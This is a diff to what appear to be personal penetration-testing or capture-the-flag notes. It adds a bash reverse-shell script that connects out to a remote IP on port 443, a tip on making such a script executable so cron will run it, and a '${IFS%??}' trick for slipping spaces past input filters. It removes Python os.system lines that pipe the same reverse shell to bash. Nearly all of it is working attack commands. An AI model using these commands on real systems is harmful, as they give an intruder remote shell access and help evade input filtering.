@@ -1,3 +1,15 @@
+
+```sh
+#!/bin/bash
+
+bash -i >& /dev/tcp/10.18.21.236/443 0>&1
+```
+
+Don't forget to make sure your script file is executable `chmod +x [script]`
+cron won't run without both #! and +x
+
+---
+
 `${IFS%??}` = space as in `which${IFS%??}bash`
 
 ^works on bash, not on zsh
@@ -42,12 +54,3 @@ os.system("touch /tmp/testfile")
 os.system("bash /tmp/revsh.sh")
 ```
 
----
-in python
-```python
-import os
-
-os.system("touch /tmp/testfile9")
-os.system("echo 'bash -i >& /dev/tcp/10.18.21.236/443 0>&1'|bash")
-```
-observe: os.system("bash -i >& /dev/tcp/10.18.21.236/443 0>&1") may not work but the above does, funny
